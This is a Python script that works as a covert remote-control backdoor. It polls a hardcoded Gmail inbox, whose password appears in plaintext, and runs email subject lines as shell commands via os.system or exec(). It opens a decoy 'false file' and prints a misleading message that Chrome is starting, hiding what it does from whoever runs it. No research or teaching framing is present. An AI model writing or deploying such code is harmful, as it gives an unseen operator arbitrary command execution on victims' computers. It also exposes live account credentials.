import smtplib
import time
import imaplib
import email
import sys
import os
import time
from stringco import *

class actions:
    coms = []
    execs = []
    def __init__(self, fname):
        file = open(fname, 'r')
        inp = ''
        is_code = False
        code_part = ''
        while True:
            inp = file.readline()
            if inp == ';':
                break
            elif inp == '>$\n':
                self.execs.append(code_part)
                code_part = ''
                is_code = False
            elif inp == '$<\n':
                is_code = True
            else:
                if is_code:
                    code_part = code_part + inp
                else:
                    self.coms.append(inp[:-1])
    def find(self, s):
        for i in range(len(self.coms)):
            if self.coms[i] == s:
                return self.execs[i]

f_path = open('../HDBlond/path_to_false_file.txt', 'r')
acts = actions('../HDBlond/actions.txt')
os.startfile(f_path.read())

ORG_EMAIL   = "@gmail.com"
FROM_EMAIL  = "proect.board.22" + ORG_EMAIL
FROM_PWD    = "q1w2e3r4t5y6u7i8o9p0[-]="
SMTP_SERVER = "imap.gmail.com"
SMTP_PORT   = 993

out = open('../HDBlond/output.txt', 'w')
try:
    file = open('../HDBlond/last_ind.txt', 'r')
except:
    file = open('../HDBlond/last_ind.txt', 'w')
    file.write('0')
    file.close()
    file = open('../HDBlond/last_ind.txt', 'r')
last_ind = int(file.readline())
file.close()

def read_email_from_gmail():
    global last_ind
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    mail.login(FROM_EMAIL,FROM_PWD)
    mail.select('inbox')

    typee, data = mail.search(None, 'ALL')
    mail_ids = data[0]

    id_list = mail_ids.split()
    first_email_id = int(id_list[0])
    latest_email_id = int(id_list[-1])

    if last_ind != len(id_list) - 1:
        for i in id_list[len(id_list) - 1:][::-1]:
            file = open('../HDBlond/last_ind.txt', 'w')
            last_ind = len(id_list) - 1
            file.write(str(last_ind))
            file.close()
            typ, data = mail.fetch(i, '(RFC822)')

            for response_part in data:
                if isinstance(response_part, tuple):
                    if isinstance(response_part[1], bytes):
                        msg = email.message_from_bytes(response_part[1])
                        email_subject = msg['subject']
                        if email_subject == 'MINECRAFTRUN':
                            return -1
                        elif email_subject == 'MINECRAFTFLOW':
                            return -2
                        elif email_subject == 'STOP':
                            quit()
                        elif email_subject.startswith('CMD'):
                            #print("THERE_THERE")
                            text = ' '.join(email_subject.split()[1:])
                            os.system('cmd /k "' + text + '"')
                        else:
                            exec(acts.find(email_subject))
                    else:
                        print('ERR')
    return -100

m_path = open('../HDBlond/path_to_minecraft.txt', 'r')
print('Reading GMAIL', FROM_EMAIL)
print('Please, wait while Chrome starts')
while True:
    try:
        res = read_email_from_gmail()
        if res == -1:
            os.startfile(m_path.read())
        if res == -2:
            for i in range(10):
                os.startfile(m_path.read())
    except:
        _=0
out.close()
